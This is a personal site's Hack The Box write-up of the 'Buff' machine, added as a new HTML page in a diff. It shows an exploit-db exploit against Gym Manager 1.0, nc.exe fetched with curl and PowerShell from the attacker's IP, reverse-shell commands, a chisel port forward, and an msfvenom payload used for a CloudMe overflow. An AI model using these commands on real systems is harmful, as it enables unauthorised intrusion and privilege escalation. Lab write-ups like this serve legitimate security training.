@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <title>HTB - Buff</title>
+    <meta name="description" content="Jafor&#39;s Website.">
+    <meta name="author" content='Jafor'><link href="https://fonts.googleapis.com/css2?family=Inconsolata:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css" integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">
+
+    
+    <link rel="stylesheet" href="/sass/researcher.min.css">
+
+    
+        <link rel="icon" type="image/ico" href="https://benwick921.github.io/favicon.jpg">
+    
+</head>
+
+    <body><div class="container mt-5">
+    <nav class="navbar navbar-expand-sm flex-column flex-sm-row p-0">
+        <a class="navbar-brand mr-sm-auto" href="https://benwick921.github.io">Jafor</a>
+        <div class="navbar-nav flex-row">
+            
+                
+                
+                    <a class="nav-item nav-link" href="/resume">Resume</a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/blog">Blog</a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/writeups">Writeups</a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/resources">Resources</a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/contact">Contact</a>
+                    
+                
+            
+        </div>
+    </nav>
+</div>
+<hr>
+<div id="content">
+<div class="container">
+    <h1> <span style="color:#da1953">HTB</span> - Buff</h1>
+<p><img src="/writeups/htb_buff/cover.png" alt="Cover"></p>
+<h1> <span style="color:#da1953">Ind</span>ex</h1>
+<ul>
+<li><a href="#SCAN">Scanning</a></li>
+<li><a href="#EXPGYM">Exploiting Gym Manager</a></li>
+<li><a href="#UPSHELL">Upgrading the shell</a></li>
+<li><a href="#UFLAG">User flag</a></li>
+<li><a href="#PRIVESC">Privilege escalation</a>
+<ul>
+<li><a href="#VULNPROC">Search vulnerable process</a></li>
+<li><a href="#CLOUDVER">Finding CloudMe version</a></li>
+<li><a href="#PORTFW">Port forwarding</a></li>
+<li><a href="#LOCALEXP">Local exploitation</a></li>
+</ul>
+</li>
+</ul>
+<h1 id=SCAN> <span style="color:#da1953">Sca</span>nning</h1>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">PORT     STATE SERVICE    VERSION
+7680/tcp open  pando-pub?
+8080/tcp open  http       Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
+</code></pre></div><h1 id=EXPGYM> <span style="color:#da1953">Exp</span>loiting Gym Manager</h1>
+<p>The scannig reveals that there is a webserver running on port 8080 so I go to check it hoping to find some interesting information.<br>
+In the page <em>contact</em> there is a information about the sofware used to build the site which is:<br>
+<code>Gym Manager Software 1.0</code>.</p>
+<p><img src="/writeups/htb_buff/1.png" alt="CMS"></p>
+<p>Searching a vulnerability or and exploit for, it leads me in <a href="https://www.exploit-db.com/exploits/48506">https://www.exploit-db.com/exploits/48506</a>.<br>
+Then I donwloaded and run it as <code>python 48506.py http://10.10.10.198:8080/</code> and it ended up exploiting the software and giving me a shell.<br>
+I can&rsquo;t do much with this shell, I cant change directory or do any other stuff so I need to upgrade the shell.</p>
+<h1 id=UPSHELL> <span style="color:#da1953">Upg</span>rading the shell</h1>
+<p>In order to do so I decided to download netcat (nc) to the server and it includes few steps:</p>
+<ol>
+<li>Open a webserver in my kali inside my Buff folder that I created to solve the box where I have all the exploits and programs <code>sudo python3 -m http.server 8080</code>
+<img src="/writeups/htb_buff/2.png" alt="Python Web Server.png"></li>
+<li>From the box I can connect to the python http server and download file, to do that there are two ways:
+<ol>
+<li><code>powershell iwr http://10.10.14.197:8080:/nc.exe -outf nc.exe</code></li>
+<li><code>curl http://10.10.14.197:8080/nc.exe -o nc.exe</code><br><br>
+<img src="/writeups/htb_buff/3.png" alt="Download.png"><br>
+In the directory there are also other users artifacts.</li>
+</ol>
+</li>
+</ol>
+<p>Once Downloaded I open a listener on my kali <code>nc -lvp 4444</code> and a client on the box in a way that upon connecting it will execute a command <code>nc.exe 10.10.14.197 4444 -e cmd.exe</code> it will result on havin a command of the box on my kali machine.</p>
+<p><img src="/writeups/htb_buff/4.png" alt="Exploit"></p>
+<h1 id=UFLAG> <span style="color:#da1953">Use</span>r flag</h1>
+<p>Once got the shell I can move to the location of the user flag.</p>
+<p><img src="/writeups/htb_buff/5.png" alt="User flag"></p>
+<h1 id=PRIVESC> <span style="color:#da1953">Pri</span>vilege escalation</h1>
+<h2 id=VULNPROC>Search vulnerable process</h2>
+<p>To search a vulnerable process its possible to use <code>winpeas.exe</code> but in my case I checked one by one and search for them on google to see which one is vulnerable and I ended up finding <code>CloudMe.exe</code>.</p>
+<p>Searching for an exploit I ended up finding many and various version of cloudme’s version.</p>
+<h2 id=CLOUDVER>Finding CloudMe version</h2>
+<p>While I dont have administrator provilege I cant see the version of the program with <code>tasklist</code> or <code>Get-Proces</code> so I had to look around to see if I find something.<br>
+At the end the executable was in the <code>shaun</code> user’s Download folder, which contains also the version nuber in the name.</p>
+<p><img src="/writeups/htb_buff/6.png" alt="Finding Cloudme version"></p>
+<h2 id=PORTFW>Port forwarding</h2>
+<p>I noticed that CloudMe runs on localhost port 8888 so there is no chance that I can remotly exploit it and neither locally because the script is in python and python is not installed in the box.<br>
+So I used <code>chisel</code> to forward the connection. I had to donwloaded a precompiled version for windows and linux from <a href="https://github.com/jpillora/chisel/releases/">https://github.com/jpillora/chisel/releases/</a>.<br>
+I loaded chisel in the box in the same way as nc.<br>
+From my kali machine I opened a server as shown in <a href="https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html">https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html</a><br>
+<code>./chisel server -p 7777 --reverse</code> and a client in the box as <code>chisel client 10.10.14.187:7777 R:8888:127.0.0.1:8888</code></p>
+<p><img src="/writeups/htb_buff/7.png" alt="Chisel port forwarding"></p>
+<h2 id=LOCALEXP>Local Exploitation</h2>
+<p>Now my choice of exploit comes down to four possibilities.</p>
+<p><img src="/writeups/htb_buff/8.png" alt="Local exploit"><br>
+And I choosed the PoC one.<br>
+After opening the exploit it suggest a command line to enerate a shellcode, so I generated a shellcode that I need in order to exploit CloudMe and give a reverseshell.<br>
+<code>msfvenom -a x86 -p windows/exec CMD='C:\xampp\htdocs\gym\upload\nc.exe 10.10.14.197 1111 -e cmd.exe' -b '\x00\x0A\x0D' -f python</code><br>
+Now I have replaced the new shell code with the old one inside the script.<br>
+Once exploited the CloudMe it will invoke nc.exe and try to connect to my kali machine so befor that I have to linste in port 1111.<br>
+And run the exploit from another shell.</p>
+<p><img src="/writeups/htb_buff/9.png" alt="Privilege escalation"><br>
+And the root flag in in the administrator desktop.</p>
+
+</div>
+
+        </div>
+    <div id="footer">
+        <hr>
+        <div class="container text-center mb-2">
+            <a href="https://github.com/benwick921"><small>Jafor</small></a>
+        </div>
+    </div>
+
+</body>
+</html>
